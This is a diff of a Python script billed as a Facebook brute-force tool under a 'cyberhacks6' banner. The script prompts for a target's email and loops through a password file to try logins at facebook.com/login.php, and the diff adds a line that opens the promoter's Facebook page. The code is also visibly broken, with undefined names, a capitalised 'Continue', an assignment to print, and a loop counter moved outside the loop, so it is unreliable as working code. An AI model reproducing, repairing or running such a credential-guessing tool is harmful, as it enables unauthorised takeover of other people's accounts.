@@ -34,7 +34,8 @@ print('| __| | _ )   | _ ) | _ \ | | | | |_   _| | __|   \ \ / / | __| | _ \   |
 print('| _|  | _ \   | _ \ |   / | |_| |   | |   | _|     \ V /  | _|  |   /    / /   _    / /') 
 print('|_|   |___/   |___/ |_|_\  \___/    |_|   |___|     \_/   |___| |_|_\   /___| (_)  /_/')
 print('FOLLOW US ON FB:www.facebook.com/cyberhacks6')
-sfile=open('password.txt','r')
+webbrowser.open('www.facebook.com/cyberhacks6')
+file=open('password.txt','r')
 
 def login( email, password):
     urlopen = 'https://www.facebook.com/login.php'
@@ -43,8 +44,8 @@ email = input("enter email of target:")
 print("attack will start soon please be sure the email input is correct",email +"i")
 i=0
 while FileType :
-    password=fileinput.readline()
-    i=+1
+    password=fileinput.readline();
+i+=1
 if len(password) < 10:
    Continue
    print=str(i) +" : ",password
